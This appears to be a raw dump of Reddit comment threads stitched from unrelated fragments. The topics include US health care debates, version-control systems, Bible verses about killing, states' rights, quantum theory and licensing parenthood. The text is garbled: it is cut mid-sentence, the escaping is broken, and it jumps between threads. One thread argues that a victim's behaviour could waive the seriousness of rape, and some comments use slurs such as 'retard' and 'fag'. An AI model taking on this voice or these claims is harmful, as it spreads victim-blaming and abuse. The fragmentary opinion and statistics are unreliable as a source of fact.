I used to drive through that intersection daily, people haul ass all the along that stretch. I\'d be shocked if the tropper was traveling within 20% of the posted limit.\n\n\n\n2.) Had a trooper not been involved the news report wouldn\'t have assumed a fraction as much. Also, it\'s just my observation from years of watching the news while getting ready for work, but any assumption certainly wouldn\'t have been in favor of the driver. \n\n\n\n3.)

AngryProfessor,t5_2cneq,"["" &gt;Here's another way to look at it: the way that private systems tend to have shorter waiting times is that they don't service the entire population. \n\n\n\nNeither would a publicly funded health system. We have a shortage of health care providers in this country. Most doctors work at least 50 hours/week (sometimes twice that), and I've never heard of a doctor who couldn't find a job. It will probably be impossible to get more working hours from doctors.\n\n\n\nIf the government starts paying for health care, how will that increase the amount of health care provided? \n\n\n\nAll the government can do is redistribute the care that already exists. "", '&gt;I wouldn\'t assume that. Most publicly funded health systems don\'t have the same wait times or overworked doctors that the US system has.\n\n\n\nThat might be the case. I suspect this is because either those countries have a greater supply of medical care (caused by less stringent medical licensing, for instance), or a lesser need for it (caused by better general health).\n\n\n\n&gt;That I agree with. However, it is entirely possible to a) reduce the need for doctors and b) increase the number of doctors in the system.\n\n\n\nRight now the government is actively preventing both of these.\n\n\n\na) My girlfriend wants birth control pills. Thanks to the government, she needs a doctors permission first. So instead of providing medical services, a doctor wastes time writing her a permission slip to buy pills.\n\n\n\nMy (state) government also does not allow me to get medical assistance from a professional with less than an MD (e.g., a nurse practitioner). So a doctor has to waste his time doing the job of a nurse practitioner, and someone who really needs him can\'t get care.\n\n\n\nTo tackle b), allow more medical schools to be built, and make it easier to get a medical license. Again, this is something the government is actively preventing.\n\n\n\n&gt;Exactly! Amazingly, this can make a huge difference. Think about the US public health campaigns of the 50\'s.\n\n\n\nSinging frog: ""Wash your hands before you eat, and you will get a tasty treat?"" \n\n\n\nThat worked great. So did vaccination. But I\'m not sure what the relevance is here. It\'s not like the government redistributed a limited supply of vaccine/knowledge of hygene. They simply produced more. I don\'t think thats possible for the current situation.\n\n\n\n&gt;They worked on improving the health of the entire population, because this reduced occurance of disease for everyone.Having 50% of your population without proper health care creates a breeding ground for all kinds of colourful diseases.\n\n\n\nThe public health campaigns weren\'t redistributing anything. They were mostly just spreading knowledge/vaccines. Both knowledge and vaccines are easy to make more of. Medical services are harder.\n\n\n\n&gt;You also have problems with the profit motive getting in the way of the best distribution of health care. Right now it is way more profitable to be specialist who works on highly complex and expensive procedures used by a few than to be someone who saves lives simply by handing out antibiotics or basic medical advice to the many.\n\n\n\nIt\'s more profitable to be a Ph.D. in CS doing highly complex and expensive machine learning, than it is to be a help desk guy with an MCSE. But for some reason, many people actually do the latter job. Why?\n\n\n\nThe helpdesk job takes 6 months of training, the profitable job takes 9 years of training.\n\n\n\nThanks to medical licensing laws, the ""helpdesk"" type medical jobs (giving antibiotics/basic medical advice) are only done by MDs. That\'s as dumb as requiring a Ph.D. before you can clean spyware off people\'s computers.\n\n\n\nThis is a problem caused (partially) by the government. I don\'t see how getting them to take money from me and give it to the MD\'s/beaurocrats will fix this.\n\n\n\n', ""&gt;Birth control pills aren't available over the counter in the US. You need a prescription, and that generally requires a doctor. There are sound medical reasons for this (lots of other forms of birth control are available over the counter because the they are safer medically).\n\n\n\nThis isn't really true. Birth control is basically just a cash cow for gyno's, and is quite safe. 5 minutes to write a prescription, the doctor gets $50-100, thanks to stupid laws.\n\n\n\n&gt;Now, one could perhaps make the argument that a nurse or similarly trained medical professional could handle the task, and you may be right. You will find this is in fact done in a number of countries with government insured health care. \n\n\n\nQuite true. That's one reason why health care is cheaper in France than here. And if we did this here, it would increase the supply of medical care (lowering prices).\n\n\n\nYou seem to be saying that single payer insurance will encourage the government to change the laws restricting medical care. But why gamble on that? Why not just change the laws themselves?\n\n\n\nPoliticians don't like it, since the public might realize they are causing some of the problems. But I dont care about politicians.\n\n\n\n&gt;AFAIK, it isn't done by private insured health care.\n\n\n\nOf course not. That would be illegal. If it were legal, I'm sure most private insurance would do it (it would save money, and increase profit, right?).\n\n\n\n&gt;So your assumption that this is imposed by having government insured health care is incorrect.\n\n\n\nThat's not my assumption. I'm simply pointing out that the government raises the cost of health care. And you want them to be involved in paying for it too? They already cause many problems, I don't see how giving them more power will help.""]"
AngryProfessor,t5_2fwo,"['&gt;Of course, this applies equally to pushing in a DVCS, which is the problem: the manager may not want to monitor half a dozen or more different branches, so he\'d order the employees to all push to a central repository at least every X interval, thereby destroying the main advantage (wholly-separate branches) of a DVCS. It\'d basically be just like a Subversion repo.\n\n\n\nEven in this worst case scenary, distributed VCS beats subversion. \n\n\n\nIn this scenario, with subversion, you get precisely one patch every X interval ""Partially build feature, doesn\'t work yet, but boss requires us to commit,..."". In principle, the ""..."" hides a complete description of the changes the developer made and why. In practice, hah. \n\n\n\nWith darcs/hg, you get the entire history leading up to ""Partially built..."".

All he needs to do is tell the developer to mirror any branches on a server he has access to. \n\n\n\nUltimately, with a DVCS, you can always mirror the topology of a centralized VCS. Additionally, you can use other topologies (tree structures, microbranches, ""sideways merges"") when useful. \n\n\n\nAs for code bombs, they are a failing of the developer. But they are also a failing of CVS/subversion, which make merging way more difficult than it needs to be. ']"

(Deuteronomy 13:7-12 NAB)\n\nInfidels and Gays Should Die\n\n\n\n    So God let them go ahead and do whatever shameful things their hearts desired.  As a result, they did vile and degrading things with each other\'s bodies.  Instead of believing what they knew was the truth about God, they deliberately chose to believe lies.  So they worshiped the things God made but not the Creator himself, who is to be praised forever.  Amen.  That is why God abandoned them to their shameful desires.  Even the women turned against the natural way to have sex and instead indulged in sex with each other.  And the men, instead of having normal sexual relationships with women, burned with lust for each other.  Men did shameful things with other men and, as a result, suffered within themselves the penalty they so richly deserved.  When they refused to acknowledge God, he abandoned them to their evil minds and let them do things that should never be done.  Their lives became full of every kind of wickedness, sin, greed, hate, envy, murder, fighting, deception, malicious behavior, and gossip.  They are backstabbers, haters of God, insolent, proud, and boastful.  They are forever inventing new ways of sinning and are disobedient to their parents.  They refuse to understand, break their promises, and are heartless and unforgiving.  They are fully aware of God\'s death penalty for those who do these things, yet they go right ahead and do them anyway.  And, worse yet, they encourage others to do them, too.  (Romans 1:24-32 NLT)\n\n\n\n \n\n\n\nKill Anyone who Approaches the Tabernacle\n\n\n\n    For the LORD had said to Moses, \'Exempt the tribe of Levi from the census; do not include them when you count the rest of the Israelites.  You must put the Levites in charge of the Tabernacle of the Covenant, along with its furnishings and equipment.  They must carry the Tabernacle and its equipment as you travel, and they must care for it and camp around it.  Whenever the Tabernacle is moved, the Levites will take it down and set it up again.  Anyone else who goes too near the Tabernacle will be executed.\'  (Numbers 1:48-51 NLT)\n\n\n\n \n\n\n\nKill People for Working on the Sabbath\n\n\n\n    The LORD then gave these further instructions to Moses: \'Tell the people of Israel to keep my Sabbath day, for the Sabbath is a sign of the covenant between me and you forever.  It helps you to remember that I am the LORD, who makes you holy.  Yes, keep the Sabbath day, for it is holy.  Anyone who desecrates it must die; anyone who works on that day will be cut off from the community.  Work six days only, but the seventh day must be a day of total rest.  I repeat: Because the LORD considers it a holy day, anyone who works on the Sabbath must be put to death.\'  (Exodus 31:12-15 NLT)\n\n\n\n\n\nYou forget, ""Thou shalt not kill"" is negotiable. Thou shalt not kill is more of something to do within your tribe. It\'s okay to kill people who don\'t believe the same thing as you.\n\n\n\nAnyway, all those things above are from the Old Testament.

Doc_Lee,t5_2cneq,"[' This is false and a common misconception about universal health care coverage and socialized medicine, probably brought on by far-right wing extremist loud mouths who wish to muddy the waters such as Hannity who often makes me cringe whenever I hear him talking about what he refers to as ""socialized medicine.""  The difference between universal health care coverage and socialized medicine is the difference between financing and delivery.  Universal health care coverage is a mechanism of financing health care through insurance coverage of some sort, whether it be single payer (as in Canada) or through private insurance, multi-payer systems.  This is financing health care costs.  However, the medical practice, the mechanism of delivering health care, remains private (or public as in the case of institutions which are already public such as state university hospitals or state operated free health care clinics).  By and large, the systems are private and increasingly for-profit in the US.  In Canada, however, the majority of the clinics and hospitals are public.  That does not mean opening a private practice is illegal, though, as long as you accept the universal health care insurance.  The doctor isn\'t employed by the government, his/her staff isn\'t employed by the government, and the administration of the practice isn\'t owned or controlled by the government.  What is illegal in *some* universal health care coverage systems is private insurance that offers redundant coverage, i.e. coverage that you would get under universal coverage offerings.  In Canada, the ruling was that it is illegal for a private clinic to accept a fee for services that would normally be covered under their single payer system, not ""You can\'t setup shop here...""  \n\n\n\nSocialized medicine, on the other hand, is a mechanism of health care delivery where the practicing physician works for and is directly employed by the state health care services.  In other words, the government actually runs the hospitals, employs the physicians, and handles hospital administration.  The UK has socialized medicine although even they have expanded into the private sector through private finance initiatives...which has also caused their system to undergo a period of debt.  Quite a bad choice on the account of the Conservatives in power in 1992 in the UK, and an even worse decision for the Labour party to continue the money draining practice.  I digress, however.  The point is that in socialized medicine, the delivery of the health care services is done directly by the government employees; in this case, the physicians, nurses, surgeons, etc.\n\n\n\nSo, no, to correct your assertions, private practices most certainly are not illegal under the Canadian single payer system, only private insurance.       ', ""And government workers don't deliver the health care...so what's your point?"", ""Actually, if you want to be technical about it, more people end up subsidizing rural communities so they can have health care to begin with.  Not just health insurance...but a health care system.  By and large, the rural areas have more hospitals per person than the urban areas do.  The end effect is rural hospitals do not make enough money in order to keep their doors open.  It's kind of hard to keep your doors open when you're only getting a few patients a week yet still need to be stocked up on medical supplies.  So, the rest of the country ends up subsidizing the rural parts of the country at greater amount than the urban areas through medicare financing to those rural hospitals and communities.  Back in 1997, under the Balanced Budget Act, these medicare financing payouts were cut forcing medical closures in rural areas to the point where the rural medicare financing payouts had to be re-increased under the Balanced Budget Refinement Act of 1999.  Frankly, there's no better way to decrease community health in rural communities than to put a stop to medicare.  It doesn't matter how much insurance coverage you have if you don't have a place to go for treatment.  "", ""Well, the talking point about wait times is rather stale in itself.  We always hear about the waiting times in Canada and in the UK, but if you want to look at it critically, the US isn't much better.  In fact, we don't even have the best waiting times in the world for elective surgery, which is what most people talk about for things such as hip replacement surgery.  What a terrible overall indicator of wait times!  Anyway, Germany and Japan hold the titles of shortest wait times overall for both elective and non-elective medical care, both of which are universal health care systems.  Furthermore, the Commonwealth Fund did a study that showed wait times in the US were longer for general care than in Britain, Germany, Australia, and New Zealand.  Canada was the only country surveyed that had slightly longer wait times than the US.  You wonder why the far right wing extremists always focus on Canada?  It's the only argument they have going for them, and even then, only on a few limited statistics.  Put the US health care system up against Japan, Germany, or France, and it doesn't stand a chance.   "", "" The point is that it's not socialized.  Nobody has proposed socialized medicine in the United States, no matter what the far-right wing extremists want you to believe.  If you believe that the US is headed for socialized medicine, you've had the wool pulled over your eyes.  The proposals in the US are all for universal health care coverage, i.e. insurance.  Not health care services.  The care is still provided by a combination of private and public facilities, the same as it is now in the United States.  If a clinic is private, it still remains private in a universal health care coverage system.  The only thing that changes is the entity making the insurance payout.  It's health care financing, not health care delivery. "", 'It\'s not socialized medicine in its alpha stages at all.  That really bothers me as a talking point because that\'s simply not a possibility in the US.  a) The hospitals would never stand for it.  b) The physicians would never stand for it.  c) The lobbyists for the health care industry are far far too powerful for that to ever happen.  It is the beginning of a universal health care coverage system which isn\'t a bad thing at all.  If anything, it will stem the 16% GDP expenditure the US pays in health care, 53% of which is expenditures on private insurance and private spending.  You want to pay less for the same quality of health care?  Make it a single payer, government administered health insurance system.  The physicians remain the same, the hospitals remain the same, the service remains the same.  Risk pooling over the entire population greatly lowers health care costs and increases negotiating power for services and prescription drugs (drugs accounting for 11-16% of our health care expenditure).  If you\'re so worried about cost, then look at the cost of private insurance that you\'re paying out of pocket.  The insurance premium for the average family of 4 in the US is $11,500, usually split 60/40 between employer/employee.  There\'s no saying that insurance you pay for will actually be of any use seeing as insurance companies can deny you at the drop of a hat, and I\'ve seen more than my fair share of this over the years.  Single payer allows for a 17% reduction in administration and billing (34% currently in the US, 17% in Canada...you\'d call this the ""bureaucratic overhead"" if you referred to it in a governmental system versus a private system).  Reduction in that overhead alone would lead to substantial savings.  You\'d probably get the average family of four health care down into the range of a couple grand a year.  Essentially, you wouldn\'t have to worry about, ""Oh me!  Oh my!  Where does it end?!"" because everybody would be covered, with the same damn health care they are receiving now considering the infrastructure for delivery still remains the same, yet you end up taking home a larger paycheck at the end of the day.  \n\n\n\nBottom line: more money in your (as well as your employer\'s) back pocket.  Socialized medicine?  Nope.  That\'s a far-right extremist talking point and nothing more.  It holds no water.        ', ""The modern day doctor shortage stems from the Balanced Budget Act of 1994 and 1997 where medicare education payouts were decreased to medical schools.  That actually happened at the request of the AMA, but now, they've realized the doctor and nursing shortage on the horizon and have changed their tune.  The simplest way to increase the number of doctors and nurses in the field is to reinstate the medicare education funds that were withdrawn to allow larger enrollments in medical schools.  The number of doctors and nurses would increase shortly thereafter thereby increasing the amount of health care available.  There is no shortage of candidates actually applying to medical school as the number of applicants has been increasing since 2002.  The matriculation rate, however, remains relatively stagnant and is a bit less than half of those who apply.  "", ""This is my life.

Note that his compassionate plea is not accompanied by a call to change the Constitution to promote Christianity in schools and courts, nor does it deviate from his stance on *any* social issues (abortion, gay rights, etc.). Which, of course, is that the federal government should not be involved. It is an issue for the states: the more divisive the issue, the more local should be the solution.\n\n\n\n2. Religion is a national issue and should take a back seat to our responsibility in the global community. There are more important things at stake right now. Our country kidnaps, holds people without trial and tortures. Our president monitors phone calls and searches our property without warrants. We invade third world countries in the name of ""freedom"", and threaten others with nuclear weapons and mass bombing campaigns.

It would not remove their ability to hear cases on religion or other first ammendment issues.\n\n\n\nThe bill clearly states this:\n\n\n\n&gt; The Supreme Court of the United States and all other Federal courts--\n\n\n\n&gt; (1) are not prevented from determining the constitutionality of any Federal statute or administrative rule or procedure in considering any case arising under the Constitution of the United States; ', ""&gt; this kind of reasoning would have condemned African Americans in Southern states to slavery.\n\n\n\nNot true--the exact opposite, in fact. Strong state rights are what allowed the abolitionist movement to gradually legalize slavery in the North, one state at a time. If they had our current top-heavy federal government supported by, say, a strong pro-slavery lobbyist consortium, that may not have happened. Not to mention, the whole thing eventually ended in a Constitutional amendment once it was no longer controversial.\n\n\n\nI think gay marriage is a close parallel to the gradual legalization of African American rights. If Ron Paul is successful in pushing the gay rights issue down to the states where it belongs, then you'll see it slowly legalized on a state-by-state basis.

Here is a little exert to show what i mean:\n\n\n\n&gt;What superpower would I have? Immediately the first thing that came to mind was the ability to pause time, similar to the Japanese guy in Heroes. Can you imagine how great it would be to have that superpower? I could potentially stay in bed for hours, press play when I wanted to go to work and pause time again for an extended three hours lunch break. More importantly, I could rob banks and make myself filthy rich and never have to work again. Nobody would see me. I could even be a good Samaritan and pause time as someone was about to get hit by a car, dive heroically pushing them out of the way and save them from certain death.\n\n\n\n&gt;However, being the nerd that I am I started to see the shortcomings in this superpower. It would mess up my body clock. The world would think its 8am and my body would think it is 11am. I would start to fall asleep at 7pm or 8pm. That wouldn’t be much fun especially if I was planning a night out away from my computer screen. Perhaps a night in front of the TV instead.\n\n\n\n&gt;Secondly, if I pause time, will it just be people who pause or will machines pause as well? Will the CCTV keep running as I rob Chase Manhattan Bank for the second time? If machines pause as well, will that mean that the electrons that power my electricity will stop spinning?\n\n\n\n&gt;I would no longer be able to spend countless hours on Facebook, Reddit and You Tube. My BitTorrent downloads would cease! Oh the pain! It was time to find a new superpower as I twisted and turned in my bed.\n\n\n\nStopping time.  How would this mess with your biological clock?  stop time again and get a full nights rest, fuck around until your perceived time matches up with the actual time, and then start time again.  not a hard concept.  Also, of course machines would stop too.  Stopping time is not the same as stopping people; everything ceases to move (including those little electrons and shit that power this fag's computer, so i guess he can't fucking poke people on facebook).  When you would start time, it would be as if it was never stopped, so electronics wouldn't shut down.\n\n\n\nThe part of this superpower that gets me is vision.  Our eyes capture and interpret reflected light into images.  If light stops moving, how would we see?\n\n\n\nneedless to say, this article got a downmod from me.

I can't think of a single other man on TV who could do that.  The rest of them who are well liked by a female audience have more of a pandering personality.  Dr. Phil, Donaghue, and so on.  Well, one more exception would be that guy with the judge show who isn't really a judge.  I can't remember his name, which is my point.  He doesn't have the stage presence.\n\n\n\nThis talk about daytime talk show hosts sounds pretty ridiculous on the face of it, but this I believe that is actually how public policy is shaped.  I'll give you an example.  Michael J. Fox did a commercial in which he didn't suppress his tremors like he usually does.  He railed against the Republicans in Congress who were blocking stem cell research that could develop treatments for degenerative nerve diseases like his.  The GOP threw a fit, and genuinely got scared. They got scared because the people at home asked themselves, hey, that's that Republican guy that was on that show in the '80s.  He's like Reagan.  I like him.  So he is mad at the other Republicans?  What did they do?  He's all shaky and they won't let him have his medicine?  That's terrible!\n\n\n\nThe fact that Fox is a Canadian citizen and only played a Republican on TV, but was never formerly involved in politics doesn't matter.  He was able to exploit people's ignorance to advance his cause.  And advance it he did.\n\n\n\nAll the well reasoned arguments in the world wouldn't hold a candle to the change we could push through if Montel Williams had a teenage girl on his show who broke down in tears after describing her father's suicide when his ex-wife raised his child support to higher than his take-home pay and he was about to go to jail.

It's a great article!"", ""   Thing is, as 'beautiful' as string theory is, and as coherent as it is mathematically, it is just that: a series of mathematical theoremish things.

The simple existence of mirrors, or tinted glass which cannot be explained in classical physics or any other theory that I know of, or even the transistor which powers the computer you are typing on right now are explained by the model called Quantum Theory (tunneling). The double slit experiment is irrefutable: it happens every time (wave). The fact that one part of this model can explain daily phenomena doesn't require that the other parts of this model be in any way intuitive. It is only required that this model never be contradicted, which so far, it hasn't been substantially.  \n\n\n\n (And then there's the whole fact that String theory would encompass quantum theory...)\n\n\n\n Remember that quantum theory has some extremely simple historic underpinnigs. Underpinnings from observations made in the late 19th century when there wasn't any fancy tools for experimenting with. The speed of light, the weight of atoms etc, were all derived from very clearly observable phenomena that aren't at all secretly hidden behind vaults... They are all a natural movement forward from what Maxwell discovered. QM isn't even Relativistic, meaning that ironically, QM didn't come as a quantum leap.

You are hearing things you want to hear.\n\n\n\n Quantum theory was inescapable in the face of the simplest form of EM radiation observations. Observing the fact that a moving electric field was a magnetic field led to some pretty grandiose requirements. \n\n\n\nThe most important one was that the simple model of the atom was broken. A spinning electron would radiate its energy through the magnetic field it created and eventually would collapse onto the nucleus.\n\n\n\n Bohr realized that the only way for this not to be possible was if the electron was behaving like a wave wrapped around the nucleus, which implied that the energy transitions could only occur in quanta, or integer multiples.\n\n\n\n That is quantum theory. Period. Maxwell discovered it using a comb and some wires, and that plain and simple observation led to the logical conclusion that only Quantum physics could reign at microscopic levels.\n\n\n\n Mixing Copenhagen with this is your little slight of hand.

We can trade our wasteful semi-free market system, which fails to insure everyone and often fails to keep those who can afford insurance insured (prexisting conditions and whatnot) for a socialist style system, where everyone will be given a minimum of care. There may be wait times (though I find most reports to be a bit exagerated. Wait times for emergency and critical stuff is usually as low or lower, non-emergency stuff perhaps not), but you are covered no matter what and the costs are lower, paid through taxes.\n\n\n\nI would not do away with private insurance totally. The idea of the socialized system is to provide a basic level of care for all people. To me, that means lots of preventative medicine, basic stuff, etc...

Check out WHO reports. Average wait times, though higher, are nowhere near unnaceptable.

This is because it was true. I was my own agent, and not one of theirs. I felt sorry for some of these poor, loyal  fools, quaking at some fat bullies command. At one place, they started random pee testing of their employees. I told the ass-hat in charge of this little pogrom that he could test anyone he felt like, except for me. He had a fit but was powerless. Boy, did that ever feel good! And this was the best power of all, because if a boss did turn out to be an abusive asshole, I could just say ""See you later, shithead!"" and find a decent job the next day.

I don\'t question that rape might warrant a harsher punishment.\n\n\n\nI\'m asking: What exactly is it that it requires a harsher penalty, and if that thing is waived or dismissed by the victim, does it warrant the harsher punishment? But, again, people are going into *misogynist lynch mode* and not thinking.\n\n\n\nJust like you.\n\n\n\nI wonder if there are circumstances that would reduce it to the non-rape assault penalties, and you read ""WOMEN HAVE NO RIGHT TO REFUSE CONSENT"".\n\n\n\nI\'m starting to think that people on reddit don\'t have what it takes to have a serious discussion about anything. Though it is amusing that in jumping all over themselves to lambast those they perceive as villains, they miss the real ones, often enough.', ""I'm calling dibs on being wedged in between all the young women."", '&gt; Editted to add: Why are you taking this personally?\n\n\n\nBecause it\'s either that you\'re seeing something in there that makes me a misogynist, and I\'m not...\n\n\n\nOr you just have these religiously sacred beliefs that cannot be questioned.\n\n\n\nAnd I\'m not sure what\'s worse.\n\n\n\n&gt; By definition, rape means that the person has not consented.\n\n\n\nCan we agree that there are what we\'d obviously call rapes, that are less physically hurtful than some minor beating? For whatever reason.\n\n\n\nAlso, assume (though I\'ve not looked these up closely) that for a beating comparable to those rapes, a person convicted will receive a lesser sentence, than for the comparable rapes.\n\n\n\nWhy is that? In a mugging, you\'ve refused to consent to giving the money away. So it\'s not plain, generic ""consent"".\n\n\n\n&gt; In modern times, until the last 30 years or so, many states had laws that a woman had no right to refuse sex from her husband.\n\n\n\nAgain, this is hardly irrelevant to the distinction I\'m trying to make. Similar laws had it that she had no right to refuse beatings from her husband, to an extent. Neither is right.\n\n\n\nWhat is the difference, what makes one worse than the other?\n\n\n\n&gt; Additionally, you\'re overlooking the fact that a woman legally has a right to withdraw consent.\n\n\n\nThis seems irrelevant. What was it that I said that made you so sure I\'m saying that no crime was committed?\n\n\n\nI\'m trying to understand the distinction between two different crimes, and why though physically comparable in injury (even to an extent, in dignity), one is penalized much more harshly than the other.\n\n\n\nIf indeed, it is as it seems that rape violates something ""special"", whatever that is, is it not possible that that might be implicitly waived by circumstance or behavior? That this crime was at most aggravated assault plus theft of services?', ""&gt; Don't be ridiculous. Rape is LEGALLY DEFINED in terms of consent.\n\n\n\nThe legal definitions are irrelevant. If I were asking what was legal, and what were not, I'd hire a lawyer, not try to have a conversation on reddit.\n\n\n\nSome advice: Next time, assume that I'm referring to why it should be that the laws are that way, etc.\n\n\n\n&gt; What are you trying to claim: that the prostitute has a right to consent to sex, but it's not rape to force her?\n\n\n\nNo. I'm making no claims, so much as I'm asking a question. I couldn't have made it any plainer than I have already, so I must conclude you're a retard.\n\n\n\nIf I assault you, and I punch you in the face several times, breaking a nose or cheekbone, that's a crime.\n\n\n\nIf I assault you, and I kick you in the ribs, breaking a few, that's a crime.\n\n\n\nBoth are considered comparable, or should be. They're both violent, cruel, injurious, and show little regard for a desire for peace or civilized behavior. All other things equal, those two assaults should receive similar penalties. Please answer directly: Is this not so?\n\n\n\nNow, let's imagine a third assault. A man attacks a woman, he injures her physically about as much as the above two attacks. Nothing truly life-threatening, nothing debilitating. Emotionally, I suppose, there is a greater chance that she will be scarred by this attack, but then, so would some be by the two examples above.\n\n\n\nWhy should that assault, the one on the woman, carry a harsher penalty? Why, if it's sexual, does it carry a harsher penalty, than if it were a beating? Is it that the victim is a woman? Is it just another american thing, where any time sex is mentioned, people's brains shut down? If the rape deserves more of a penalty than a mundane assault (which my above example could just as easily have been describing), then what is the distinction here, and can whatever that difference is ever exist seperately or optionally to the attack?\n\n\n\nI realize this will make you think, if you decide to actually read. But you seem to refuse to do that, so no worries that you'll pop a blood vessel in that brain of yours.\n\n\n\n&gt; You're going to have to pick a lane. It's just not possible for a person to retain the right to refuse sex and at the same time be subject to that kind of waiver.\n\n\n\nAnd why is this? I'm obviously not talking of a waiver in the legal sense, where two lawyers draw up papers, it's signed and notarized and filed with the clerk.\n\n\n\nIf the behavior itself amounts to the implicit waiving of the right to seek harsher penalties, that would be sufficient. Can behavior itself waive such? What is the distinction that makes any rape a more heinous crime than an otherwise similar assault? Is it something magical, so otherworldly that you hesitate to nail it down for fear of blasphemy?\n\n\n\n&gt; Whether an attack is rape doesn't depend on whether one likes the victim's conduct\n\n\n\nIt just depends on what part of the body was assaulted. Our magical genitalia, so much more precious than our lungs and carotoid and liver and skin and bones...\n\n\n\nAnd you keep droning on about consent.

I wanted to provoke a discussion of why they are the way they are. So consequences of ""no change"" don\'t mean a whole lot, now do they.\n\n\n\n&gt; All you have is personal attacks and ""questions"" about whether women really deserve to have rape considered rape if they aren\'t good little girls.\n\n\n\nYes, continue with the mischaracterization. \n\n\n\nActually, it should be gender neutral, shouldn\'t it?

I actually tried hg after writing my comment and it's really much much simpler than a centralized VCS.  \n\n\n\n\n\nThe thing to keep in mind is that there's no central server, when you push/pull changes you just merge your repository with the foreign one (sort of). Branching occurs by just copying the directory to a new one (which is a bit unhelpful if you have other files in there, but great overall) so if your branch sucks it doesn't remain forever in your history, you just delete it. If you like it, you just merge it back in.  \n\n\n\n\n\nI don't know how convenient it would be to have a folder for each branch you want, but since I never use branches because I don't want to clutter my SVN repo with them, this is a step up.  \n\n\n\n\n\nTo push/pull changes to remote repos, you just copy (over) their files over SSH/HTTP.

I can\'t have one repository with my directories spread around the hard drive, can I? From what I understand, the working directories in the repository should be under a main directory. Right now I have one SVN repository for all my code, and I just make folders in that, and would like to recreate this in hg if possible (so I could have ONE directory on the server to push to, but I guess I could recreate the setup by having multiple repositories under a ""repos/"" dir on the server).']"

By raising a kid you implicitly take a hand in determining the direction of the entire human race.\n\n\n\nAs I said, bikes and cars only put a very few people at risk at any one time, but raising another Pol Pot, or Cheney, or Kim-Jong Il has exactly the same effect, and more, to thousands or millions of people.\n\n\n\nI understand that killing people who are already alive is bad (obviously), and that pretty much everyone (present US administration aside) subscribes to the idea of inalienable human rights - I also do.\n\n\n\nWhat I\'m not so clear on is why having children is one of these inalienable human rights - you can live a perfectly fulfilled life without siring offspring (no-one\'s saying don\'t have sex, or offer to help with other people\'s kids).\n\n\n\nWe already routinely screen child-care workers, teachers, babysitters and the like to determine if they\'re ""suitable"" to work with kids... but we don\'t screen the one or two people who spend the vast majority of their time with the child, and from whom the child derives the majority of their young experience and opinions - whether educational or traumatising.\n\n\n\nWe also ban paedophiles (for example) from any contact with children... and yet someone who picks up their baby in a fit of pique and uses it to club their partner in the head, fracturing the kids skull and putting its very *life* at risk... is free to go on banging out sprogs as long as she wants.\n\n\n\nYou\'ve probably guessed by now that I\'m playing devil\'s advocate, but I\'m still curious to see if anyone can give me a good answer.\n\n\n\nI take your point about the risk of letting in eugenics by the back-door... but why does the determining factor have to be anything controversial?\n\n\n\nBefore you\'re allowed to have a kid you have to take a few parenting classes, you have to demonstrate you have the material resources to care for this kid *in addition to* any you already have, and you perhaps have to undergo a short counselling course to make sure you want to have a kid for the right reasons (ie, because you want to raise one, not because you\'re trying to save a marriage, or need someone to bully, or want a bigger welfare cheque).\n\n\n\nFail the tests (or pass them and then mistreat your kid) and you lose the right to any more, either for a defined period and/or until you reapply and pass the test again.\n\n\n\nNone of these things should reasonably prevent someone from having at least one or two kids - even families on welfare can afford to raise a couple of kids.\n\n\n\nWhat it will do is stop people having kids for the wrong reasons, having more kids than they can reasonably support, and it\'ll emphasize that having kids should be an honour and an obligation to treat the kid right, not a god-given right you can abuse at will, or a route to a larger state handout.\n\n\n\nAs I said, I don\'t fully believe this - it\'s a hypothetical thought experiment... but what\'s wrong with it?', '&gt; Because, unlike bikes, cars, etc, where the criteria for being competent is quite evident, being a ""good parent"" is often arbitrary and subjective.\n\n\n\nThat\'s a good point, although I offered a basic list in [another post](http://reddit.com/info/5ybds/comments/c029a5o) in this thread.\n\n\n\nAlternatively, if it\'s too difficult to define ""good parent"", perhaps we could do the opposite - define what makes a ""bad parent"", and then legally remove the right for them to have any *more* kids.\n\n\n\nWe already remove kids from abusive homes, so there\'s a precedent for removal of a kid.  I\'m also not talking about rendering the offender sterile of anything permanent - simply ban them from having children, with immediate adoption of the child and *incredibly* harsh punishment for anyone who violates the ban.\n\n\n\nPeople can use birth control if they want, or they can simply refrain from penetrative sex.  Either way, they are no longer allowed to be the primary caregiver of a child, since they have proven themselves unworthy of the honour.\n\n\n\nWe ban people from driving who have abused the privilege, and that\'s not *really* all that dangerous.  Why not ban people from having another kid, if they\'ve already proven themselves incapable of the job?\n\n\n\n&gt; The same thing happened with ""literacy tests"" that blacks had to take to vote. Imagine how a parent test could be distorted to reinforce social institutions and prevent people that society doesn\'t like from breeding!\n\n\n\nFair point.  But generally as a society we already have a system which assesses if someone\'s a ""bad parent"", and removes the kid if so.  What\'s so hard about removing a kid and then banning the offender from having any more?\n\n\n\n&gt; The only way I could see it working is if you had some sort of genetic criteria for reproducing, and, while it could work, I have a feeling that people couldn\'t get eugenics out of their minds for long enough to even consider it.\n\n\n\nWhy such basic and genetic conditions?  I\'m talking about being financially able to support another kid (in addition to any they\'ve already got), not having any prior convictions for child-abuse or domestic violence, maybe undergoing a short course of parenting and anger-management classes, and a short course of counseling to ensure they\'re having kids for the right reasons (""because I want to raise a child well"", rather than ""this will save my marriage"" or ""this will get us a bigger welfare cheque"").\n\n\n\nAs i mentioned in the other post, I\'m playing devil\'s advocate here - I don\'t honestly believe that this is necessarily the way forward, but I\'m curious as to why everyone\'s *so* against they\'ll refuse to even contemplate the hypothetical scenario.\n\n\n\nIt appears we\'ve hit upon another of society\'s irrational taboos, and people would rather downmod-and-forget than discuss it openly. &lt;:-)', ""&gt; Lucid dreaming is one of those things that no one can prove exist to you because unless you experience it yourself you'll have to just take it on faith.\n\n\n\nNot exactly, IIRC.  I don't have the references to hand, but I remember reading about studies which demonstrated markedly different brain-behaviour in the brains of lucid dreamers.  And moreover, patterns that seemed to correlate strongly with the reported experience of lucid dreaming.\n\n\n\nMust try to find the article again..."", 'Fair point.  However, perhaps some measure of suffering is appropriate if someone has shown themselves incapable of looking after a child.\n\n\n\nFreedom is also commonly held to be a human right, but if someone proves themself incapable of having it without abusing it (say violent crime, or murder), we lock them up.\n\n\n\nIf someone has shown themself to be incapable of looking after a child without neglect or abuse, you could ask why their ""right"" to a child trumps the child\'s right to an abuse-free, supportive, caring family life?', '&gt; All of these things are subjectively ""bad"" for the child. They\'re not inherently bad, they\'re bad only because society deems them as ""bad."" Try making social change when you\'re forced, by a test of some sort, to tailor your children to a specific worldview. Republicans would orgasm at the thought of it.\n\n\n\nThat\'s a very good point, but it doesn\'t have to be that way.\n\n\n\nFor example, you could ask how we could possibly imprison people for refusing to conform to society\'s requirements.\n\n\n\nI mean, if you *start* 